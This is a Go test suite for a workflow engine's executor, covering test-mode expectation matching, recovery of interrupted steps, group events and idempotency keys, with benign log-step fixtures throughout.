func (s *EngineTestSuite) TestTestMode_ExpectErrorMissing() {
	exec, bus := newTestExecutor()
	defer bus.Close()

	// Step succeeds but expect says there should be an error
	wf := &parser.Workflow{
		Version: "2.0",
		Name:    "test-expect-error-missing",
		Steps: []parser.Step{
			{
				ID:     "step1",
				Action: "log",
				Config: map[string]any{"message": "ok"},
				Testing: []parser.TestCase{
					{
						Name: "want-error",
						Expect: &parser.TestCaseExpect{
							Error: &parser.TestCaseError{Message: "should have failed"},
						},
					},
				},
			},
		},
	}

	result, err := exec.Execute(context.Background(), wf, nil, ExecuteOptions{TestCaseName: "want-error"})
	s.Require().NoError(err)
	s.Equal("failed", result.Status) // expect failed
}

func (s *EngineTestSuite) TestTestMode_ExpectErrorMessageMismatch() {
	exec, bus := newTestExecutor()
	defer bus.Close()

	wf := &parser.Workflow{
		Version: "2.0",
		Name:    "test-expect-error-msg",
		Steps: []parser.Step{
			{
				ID:          "step1",
				Action:      "log",
				Config:      map[string]any{"message": "hi"},
				ErrorPolicy: "continue",
				Testing: []parser.TestCase{
					{
						Name:  "err-msg-mismatch",
						Error: &parser.TestCaseError{Message: "actual error"},
						Expect: &parser.TestCaseExpect{
							Error: &parser.TestCaseError{Message: "different error"},
						},
					},
				},
			},
		},
	}

	result, err := exec.Execute(context.Background(), wf, nil, ExecuteOptions{TestCaseName: "err-msg-mismatch"})
	s.Require().NoError(err)
	s.Equal("failed", result.Status)
}

func (s *EngineTestSuite) TestTestMode_ExpectErrorCodeMismatch() {
	exec, bus := newTestExecutor()
	defer bus.Close()

	wf := &parser.Workflow{
		Version: "2.0",
		Name:    "test-expect-error-code",
		Steps: []parser.Step{
			{
				ID:          "step1",
				Action:      "log",
				Config:      map[string]any{"message": "hi"},
				ErrorPolicy: "continue",
				Testing: []parser.TestCase{
					{
						Name:  "err-code-mismatch",
						Error: &parser.TestCaseError{Message: "err", Code: "db_error"},
						Expect: &parser.TestCaseExpect{
							Error: &parser.TestCaseError{Code: "timeout"},
						},
					},
				},
			},
		},
	}

	result, err := exec.Execute(context.Background(), wf, nil, ExecuteOptions{TestCaseName: "err-code-mismatch"})
	s.Require().NoError(err)
	s.Equal("failed", result.Status)
}

func (s *EngineTestSuite) TestTestMode_PartialMatchDeepMap() {
	exec, bus := newTestExecutor()
	defer bus.Close()

	// Mock output is a nested map; expect checks partial deep match
	wf := &parser.Workflow{
		Version: "2.0",
		Name:    "test-partial-deep",
		Steps: []parser.Step{
			{
				ID:     "step1",
				Action: "log",
				Config: map[string]any{"message": "hi"},
				Testing: []parser.TestCase{
					{
						Name: "deep",
						Output: map[string]any{
							"user": map[string]any{
								"name": "alice",
								"age":  30,
								"role": "admin",
							},
							"extra": "ignored",
						},
						Expect: &parser.TestCaseExpect{
							Output: map[string]any{
								"user": map[string]any{
									"name": "alice",
								},
							},
						},
					},
				},
			},
		},
	}

	result, err := exec.Execute(context.Background(), wf, nil, ExecuteOptions{TestCaseName: "deep"})
	s.Require().NoError(err)
	s.Equal("success", result.Status)
}

func (s *EngineTestSuite) TestTestMode_PartialMatchSlice() {
	exec, bus := newTestExecutor()
	defer bus.Close()

	wf := &parser.Workflow{
		Version: "2.0",
		Name:    "test-partial-slice",
		Steps: []parser.Step{
			{
				ID:     "step1",
				Action: "log",
				Config: map[string]any{"message": "hi"},
				Testing: []parser.TestCase{
					{
						Name:   "slice",
						Output: map[string]any{"items": []any{"a", "b", "c"}},
						Expect: &parser.TestCaseExpect{
							Output: map[string]any{"items": []any{"a", "b", "c"}},
						},
					},
				},
			},
		},
	}

	result, err := exec.Execute(context.Background(), wf, nil, ExecuteOptions{TestCaseName: "slice"})
	s.Require().NoError(err)
	s.Equal("success", result.Status)
}

func (s *EngineTestSuite) TestTestMode_PartialMatchSliceLengthMismatch() {
	exec, bus := newTestExecutor()
	defer bus.Close()

	wf := &parser.Workflow{
		Version: "2.0",
		Name:    "test-partial-slice-len",
		Steps: []parser.Step{
			{
				ID:     "step1",
				Action: "log",
				Config: map[string]any{"message": "hi"},
				Testing: []parser.TestCase{
					{
						Name:   "slice-len",
						Output: map[string]any{"items": []any{"a", "b"}},
						Expect: &parser.TestCaseExpect{
							Output: map[string]any{"items": []any{"a", "b", "c"}},
						},
					},
				},
			},
		},
	}

	result, err := exec.Execute(context.Background(), wf, nil, ExecuteOptions{TestCaseName: "slice-len"})
	s.Require().NoError(err)
	s.Equal("failed", result.Status)
}

func (s *EngineTestSuite) TestTestMode_PartialMatchScalarMismatch() {
	exec, bus := newTestExecutor()
	defer bus.Close()

	wf := &parser.Workflow{
		Version: "2.0",
		Name:    "test-partial-scalar",
		Steps: []parser.Step{
			{
				ID:     "step1",
				Action: "log",
				Config: map[string]any{"message": "hi"},
				Testing: []parser.TestCase{
					{
						Name:   "scalar",
						Output: map[string]any{"value": "actual"},
						Expect: &parser.TestCaseExpect{
							Output: map[string]any{"value": "expected"},
						},
					},
				},
			},
		},
	}

	result, err := exec.Execute(context.Background(), wf, nil, ExecuteOptions{TestCaseName: "scalar"})
	s.Require().NoError(err)
	s.Equal("failed", result.Status)
}

func (s *EngineTestSuite) TestTestMode_PartialMatchTypeMismatch() {
	exec, bus := newTestExecutor()
	defer bus.Close()

	// Expect a map but actual is a string
	wf := &parser.Workflow{
		Version: "2.0",
		Name:    "test-partial-type",
		Steps: []parser.Step{
			{
				ID:     "step1",
				Action: "log",
				Config: map[string]any{"message": "hi"},
				Testing: []parser.TestCase{
					{
						Name:   "type-mismatch",
						Output: map[string]any{"data": "just a string"},
						Expect: &parser.TestCaseExpect{
							Output: map[string]any{"data": map[string]any{"nested": true}},
						},
					},
				},
			},
		},
	}

	result, err := exec.Execute(context.Background(), wf, nil, ExecuteOptions{TestCaseName: "type-mismatch"})
	s.Require().NoError(err)
	s.Equal("failed", result.Status)
}

func (s *EngineTestSuite) TestTestMode_PartialMatchSliceTypeMismatch() {
	exec, bus := newTestExecutor()
	defer bus.Close()

	// Expect a slice but actual is a string
	wf := &parser.Workflow{
		Version: "2.0",
		Name:    "test-partial-slice-type",
		Steps: []parser.Step{
			{
				ID:     "step1",
				Action: "log",
				Config: map[string]any{"message": "hi"},
				Testing: []parser.TestCase{
					{
						Name:   "slice-type",
						Output: map[string]any{"data": "not a slice"},
						Expect: &parser.TestCaseExpect{
							Output: map[string]any{"data": []any{1, 2}},
						},
					},
				},
			},
		},
	}

	result, err := exec.Execute(context.Background(), wf, nil, ExecuteOptions{TestCaseName: "slice-type"})
	s.Require().NoError(err)
	s.Equal("failed", result.Status)
}

func (s *EngineTestSuite) TestTestMode_ExpectNoResult() {
	// Call checkTestExpect directly with a step that has no result in the context
	exec, bus := newTestExecutor()
	defer bus.Close()

	execCtx := runtime.NewExecutionContext("test-id", "test-wf", nil, nil)
	step := parser.Step{ID: "ghost"}
	expect := &parser.TestCaseExpect{Status: "success"}

	err := exec.CheckTestExpectExposed(step, expect, execCtx)
	s.Require().Error(err)
	s.Contains(err.Error(), "has no result")
}

func (s *EngineTestSuite) TestTestMode_PartialMatchSliceElementMismatch() {
	exec, bus := newTestExecutor()
	defer bus.Close()

	wf := &parser.Workflow{
		Version: "2.0",
		Name:    "test-slice-elem",
		Steps: []parser.Step{
			{
				ID:     "step1",
				Action: "log",
				Config: map[string]any{"message": "hi"},
				Testing: []parser.TestCase{
					{
						Name:   "slice-elem",
						Output: map[string]any{"items": []any{"a", "b", "c"}},
						Expect: &parser.TestCaseExpect{
							Output: map[string]any{"items": []any{"a", "WRONG", "c"}},
						},
					},
				},
			},
		},
	}

	result, err := exec.Execute(context.Background(), wf, nil, ExecuteOptions{TestCaseName: "slice-elem"})
	s.Require().NoError(err)
	s.Equal("failed", result.Status)
}

func (s *EngineTestSuite) TestTableActionEmitsPrintLogs() {
	exec, bus := newTestExecutor()
	defer bus.Close()

	ch := bus.Subscribe(64)

	wf := &parser.Workflow{
		Version: "2.0",
		Name:    "table-test",
		Steps: []parser.Step{
			{
				ID:     "t1",
				Action: "table",
				Config: map[string]any{
					"columns": []any{
						map[string]any{"header": "Name", "field": "name"},
					},
					"items": []any{
						map[string]any{"name": "Alice"},
					},
				},
			},
		},
	}

	result, err := exec.Execute(context.Background(), wf, nil)
	s.Require().NoError(err)
	s.Equal("success", result.Status)

	var logs []event.Event

	for len(ch) > 0 {
		ev := <-ch
		if ev.Type == event.StepLog {
			logs = append(logs, ev)
		}
	}

	s.NotEmpty(logs)

	for _, ev := range logs {
		_, hasStream := ev.Data["stream"]
		s.False(hasStream, "table logs should not be stream logs")
	}
}

func (s *EngineTestSuite) TestExecute_RecoverySkipsCompletedSteps() {
	exec, bus := newTestExecutor()
	defer bus.Close()

	var executedSteps eventCollector[string]

	ch := bus.Subscribe(100)
	go func() {
		for ev := range ch {
			if ev.Type == event.StepStarted {
				executedSteps.add(ev.StepID)
			}
		}
	}()

	wf := &parser.Workflow{
		Version: "2.0",
		Name:    "test-recovery",
		Steps: []parser.Step{
			{ID: "step1", Action: "log", Config: map[string]any{"message": "hello"}},
			{ID: "step2", Action: "log", DependsOn: []string{"step1"}, Config: map[string]any{"message": "world"}},
			{ID: "step3", Action: "log", DependsOn: []string{"step2"}, Config: map[string]any{"message": "!"}},
		},
	}

	now := time.Now()
	recoveredSteps := map[string]*runtime.StepResult{
		"step1": {
			Status:     runtime.StatusSuccess,
			StartedAt:  &now,
			FinishedAt: &now,
			Output:     map[string]any{"message": "hello"},
		},
	}

	result, err := exec.Execute(context.Background(), wf, nil, ExecuteOptions{
		Resumed:        true,
		RecoveredSteps: recoveredSteps,
	})
	s.Require().NoError(err)
	s.Equal(runtime.StatusSuccess, result.Status)

	s.Eventually(func() bool {
		return executedSteps.load() >= 2
	}, 2*time.Second, 10*time.Millisecond)

	steps := executedSteps.snapshot()
	for _, stepID := range steps {
		s.NotEqual("step1", stepID, "step1 should have been skipped")
	}

	s.Contains(steps, "step2")
	s.Contains(steps, "step3")
}

func (s *EngineTestSuite) TestExecute_RecoveryOnRecoverySkip() {
	exec, bus := newTestExecutor()
	defer bus.Close()

	var executedSteps eventCollector[string]

	ch := bus.Subscribe(100)
	go func() {
		for ev := range ch {
			if ev.Type == event.StepStarted {
				executedSteps.add(ev.StepID)
			}
		}
	}()

	wf := &parser.Workflow{
		Version: "2.0",
		Name:    "test-recovery-skip",
		Steps: []parser.Step{
			{ID: "send-email", Action: "log", OnRecovery: "skip", Config: map[string]any{"message": "email"}},
			{ID: "next-step", Action: "log", DependsOn: []string{"send-email"}, Config: map[string]any{"message": "next"}},
		},
	}

	now := time.Now()
	recoveredSteps := map[string]*runtime.StepResult{
		"send-email": {
			Status:    runtime.StatusRunning,
			StartedAt: &now,
		},
	}

	result, err := exec.Execute(context.Background(), wf, nil, ExecuteOptions{
		Resumed:        true,
		RecoveredSteps: recoveredSteps,
	})
	s.Require().NoError(err)
	s.Equal(runtime.StatusSuccess, result.Status)

	s.Eventually(func() bool {
		return executedSteps.load() >= 1
	}, 2*time.Second, 10*time.Millisecond)

	steps := executedSteps.snapshot()
	for _, stepID := range steps {
		s.NotEqual("send-email", stepID, "send-email should have been skipped (on_recovery=skip)")
	}

	s.Contains(steps, "next-step")
}

func (s *EngineTestSuite) TestExecute_RecoveryOnRecoveryFail() {
	exec, bus := newTestExecutor()
	defer bus.Close()

	wf := &parser.Workflow{
		Version: "2.0",
		Name:    "test-recovery-fail",
		Steps: []parser.Step{
			{ID: "payment", Action: "log", OnRecovery: "fail", Config: map[string]any{"message": "pay"}},
			{ID: "next", Action: "log", DependsOn: []string{"payment"}, Config: map[string]any{"message": "next"}},
		},
	}

	now := time.Now()
	recoveredSteps := map[string]*runtime.StepResult{
		"payment": {
			Status:    runtime.StatusRunning,
			StartedAt: &now,
		},
	}

	result, _ := exec.Execute(context.Background(), wf, nil, ExecuteOptions{
		Resumed:        true,
		RecoveredSteps: recoveredSteps,
	})
	s.NotEqual(runtime.StatusSuccess, result.Status)
}

func (s *EngineTestSuite) TestExecute_RecoveryOnRecoveryRetryDefault() {
	exec, bus := newTestExecutor()
	defer bus.Close()

	var executedSteps eventCollector[string]

	ch := bus.Subscribe(100)
	go func() {
		for ev := range ch {
			if ev.Type == event.StepStarted {
				executedSteps.add(ev.StepID)
			}
		}
	}()

	wf := &parser.Workflow{
		Version: "2.0",
		Name:    "test-recovery-retry",
		Steps: []parser.Step{
			{ID: "create-account", Action: "log", Config: map[string]any{"message": "create"}},
			{ID: "next", Action: "log", DependsOn: []string{"create-account"}, Config: map[string]any{"message": "next"}},
		},
	}

	now := time.Now()
	recoveredSteps := map[string]*runtime.StepResult{
		"create-account": {
			Status:    runtime.StatusRunning,
			StartedAt: &now,
		},
	}

	result, err := exec.Execute(context.Background(), wf, nil, ExecuteOptions{
		Resumed:        true,
		RecoveredSteps: recoveredSteps,
	})
	s.Require().NoError(err)
	s.Equal(runtime.StatusSuccess, result.Status)

	s.Eventually(func() bool {
		return executedSteps.load() >= 2
	}, 2*time.Second, 10*time.Millisecond)

	s.Contains(executedSteps.snapshot(), "create-account")
}

func (s *EngineTestSuite) TestExecute_RecoveryWaitingStepFallsThrough() {
	exec, bus := newTestExecutor()
	defer bus.Close()

	var executedSteps eventCollector[string]

	ch := bus.Subscribe(100)
	go func() {
		for ev := range ch {
			if ev.Type == event.StepStarted {
				executedSteps.add(ev.StepID)
			}
		}
	}()

	wf := &parser.Workflow{
		Version: "2.0",
		Name:    "test-recovery-waiting",
		Steps: []parser.Step{
			{ID: "await", Action: "log", OnRecovery: "skip", Config: map[string]any{"message": "await"}},
			{ID: "next", Action: "log", DependsOn: []string{"await"}, Config: map[string]any{"message": "next"}},
		},
	}

	now := time.Now()
	recoveredSteps := map[string]*runtime.StepResult{
		"await": {
			Status:    runtime.StatusWaiting,
			StartedAt: &now,
		},
	}

	result, err := exec.Execute(context.Background(), wf, nil, ExecuteOptions{
		Resumed:        true,
		RecoveredSteps: recoveredSteps,
	})
	s.Require().NoError(err)
	s.Equal(runtime.StatusSuccess, result.Status)

	s.Eventually(func() bool {
		return executedSteps.load() >= 2
	}, 2*time.Second, 10*time.Millisecond)

	steps := executedSteps.snapshot()
	s.Contains(steps, "await")
	s.Contains(steps, "next")
}

func (s *EngineTestSuite) TestExecute_GroupActionEmitsGroupEvent() {
	exec, bus := newTestExecutor()
	defer bus.Close()

	var groupEvents eventCollector[event.Event]

	ch := bus.Subscribe(100)
	go func() {
		for ev := range ch {
			if ev.Type == event.ExecutionGroup {
				groupEvents.add(ev)
			}
		}
	}()

	wf := &parser.Workflow{
		Version: "2.0",
		Name:    "test-group-action",
		Params: []parser.Param{
			{Name: "customer_id", Type: "string"},
		},
		Steps: []parser.Step{
			{ID: "tag-customer", Action: "group", Config: map[string]any{"key": "customer-{{ params.customer_id }}"}},
			{ID: "step1", Action: "log", DependsOn: []string{"tag-customer"}, Config: map[string]any{"message": "hello"}},
		},
	}

	result, err := exec.Execute(context.Background(), wf, map[string]any{
		"customer_id": "user-42",
	})
	s.Require().NoError(err)
	s.Equal(runtime.StatusSuccess, result.Status)

	s.Eventually(func() bool {
		return groupEvents.load() >= 1
	}, 2*time.Second, 10*time.Millisecond)

	events := groupEvents.snapshot()
	s.Require().NotEmpty(events)
	s.Equal("customer-user-42", events[0].Data["group_key"])
	s.Equal("tag-customer", events[0].StepID)
}

func (s *EngineTestSuite) TestExecute_ResolvesIdempotencyKey() {
	exec, bus := newTestExecutor()
	defer bus.Close()

	var capturedKeys eventCollector[string]

	ch := bus.Subscribe(100)
	go func() {
		for ev := range ch {
			if ev.Type != event.ExecutionState {
				continue
			}

			key, _ := ev.Data["idempotency_key"].(string)
			capturedKeys.add(key)
		}
	}()

	wf := &parser.Workflow{
		Version: "2.0",
		Name:    "test-idemp",
		Trigger: &parser.Trigger{
			HTTP: &parser.HTTPTrigger{
				Method:         "POST",
				Path:           "/test",
				IdempotencyKey: "{{ params.customer_id }}",
			},
		},
		Params: []parser.Param{
			{Name: "customer_id", Type: "string"},
		},
		Steps: []parser.Step{
			{ID: "step1", Action: "log", Config: map[string]any{"message": "hello"}},
		},
	}

	_, err := exec.Execute(context.Background(), wf, map[string]any{
		"customer_id": "user-42",
	})
	s.Require().NoError(err)

	s.Eventually(func() bool {
		return capturedKeys.load() >= 1
	}, 2*time.Second, 10*time.Millisecond)

	keys := capturedKeys.snapshot()
	s.Equal("user-42", keys[len(keys)-1])
}

func (s *EngineTestSuite) TestExecute_NoIdempotencyKeyWhenNotConfigured() {
	exec, bus := newTestExecutor()
	defer bus.Close()

	var stateEvents eventCollector[event.Event]

	ch := bus.Subscribe(100)
	go func() {
		for ev := range ch {
			if ev.Type == event.ExecutionState {
				stateEvents.add(ev)
			}
		}
	}()

	wf := &parser.Workflow{
		Version: "2.0",
		Name:    "test-no-idemp",
		Steps: []parser.Step{
			{ID: "step1", Action: "log", Config: map[string]any{"message": "hello"}},
		},
	}

	_, err := exec.Execute(context.Background(), wf, nil)
	s.Require().NoError(err)

	s.Eventually(func() bool {
		return stateEvents.load() >= 1
	}, 2*time.Second, 10*time.Millisecond)

	events := stateEvents.snapshot()
	s.NotEmpty(events)
	s.Empty(events[0].Data["idempotency_key"])
}

func (s *EngineTestSuite) TestExecute_RecoveryNonRunningStepIgnored() {
	exec, bus := newTestExecutor()
	defer bus.Close()

	var executedSteps eventCollector[string]

	ch := bus.Subscribe(100)
	go func() {
		for ev := range ch {
			if ev.Type == event.StepStarted {
				executedSteps.add(ev.StepID)
			}
		}
	}()

	wf := &parser.Workflow{
		Version: "2.0",
		Name:    "test-recovery-failed-step",
		Steps: []parser.Step{
			{ID: "step1", Action: "log", Config: map[string]any{"message": "hello"}},
		},
	}

	now := time.Now()
	recoveredSteps := map[string]*runtime.StepResult{
		"step1": {
			Status:    runtime.StatusFailed,
			StartedAt: &now,
		},
	}

	result, err := exec.Execute(context.Background(), wf, nil, ExecuteOptions{
		Resumed:        true,
		RecoveredSteps: recoveredSteps,
	})
	s.Require().NoError(err)
	s.Equal(runtime.StatusSuccess, result.Status)

	s.Eventually(func() bool {
		return executedSteps.load() >= 1
	}, 2*time.Second, 10*time.Millisecond)

	s.Contains(executedSteps.snapshot(), "step1")
}

